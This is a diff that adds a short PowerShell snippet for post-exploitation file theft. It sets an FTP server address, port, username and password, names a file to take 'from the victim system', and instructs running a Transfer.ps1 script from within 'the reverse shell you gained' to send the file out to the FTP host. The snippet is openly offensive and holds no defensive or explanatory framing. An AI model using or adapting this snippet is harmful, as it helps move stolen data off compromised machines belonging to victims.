@@ -1,0 +1,9 @@
+$ftpserver      = "192.168.1.10" #Example IP
+$ftpport        = 21
+$ftpusername    = "ftpuser" 
+$ftppassword    = "password123"
+$localfilepath  = "C:\Users\Public\data.txt" #Path to the file you want to downlad from the victim system.
+$remotefilename = "data.txt" #Name of the file you want it to be saved as.
+
+#After setting up the variables in the reverse shell you gained run the folloing command.
+& C:\Windows\System32\Transfer.ps1
